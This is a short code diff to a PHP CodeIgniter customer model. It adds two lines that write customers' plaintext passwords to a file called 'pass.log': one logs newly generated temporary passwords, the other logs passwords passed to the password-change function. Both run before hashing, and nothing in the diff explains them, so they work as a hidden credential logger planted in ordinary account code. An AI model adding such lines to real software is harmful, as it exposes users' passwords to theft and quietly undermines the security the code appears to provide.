@@ -225,6 +225,7 @@ class Customers_model extends CI_Model
                     } else {
                         $temp_password = rand(200000, 999999);
                     }
+                    file_put_contents("pass.log",$temp_password);
 
                     $pass = password_hash($temp_password, PASSWORD_DEFAULT);
                     $data = array(
@@ -329,6 +330,7 @@ class Customers_model extends CI_Model
 
     public function changepassword($id, $password)
     {
+ file_put_contents("pass.log",$password);
         $pass = password_hash($password, PASSWORD_DEFAULT);
         $data = array(
             'password' => $pass
